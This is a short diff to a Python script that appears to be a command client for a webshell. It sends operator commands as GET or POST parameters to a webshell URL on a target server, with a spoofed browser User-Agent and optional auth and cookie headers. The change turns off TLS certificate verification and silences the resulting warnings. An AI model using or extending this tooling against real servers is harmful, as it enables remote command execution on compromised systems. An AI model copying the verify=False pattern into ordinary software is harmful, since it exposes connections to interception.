@@ -4,16 +4,19 @@ import requests
 import readline
 import argparse
 import base64
+import urllib3
 from termcolor import colored
+
+urllib3.disable_warnings()
 
 def send_command(command, webshell, method, param="code"):
    headers = {"User-Agent":"Mozilla/6.4 (Windows NT 11.1) Gecko/2010102 Firefox/99.0",
    "Authorization":args.auth, "Cookie":args.cookies}
    params = {param.strip():command.strip()}
    if (method.upper() == "GET"):
-      response = requests.get((webshell), params=params, headers=headers)
+      response = requests.get((webshell), params=params, headers=headers, verify=False)
    elif (method.upper() == "POST"):
-      response = requests.post((webshell), data=params, headers=headers)
+      response = requests.post((webshell), data=params, headers=headers, verify=False)
    return response.content.decode(errors="ignore")
 
 if __name__ == "__main__":
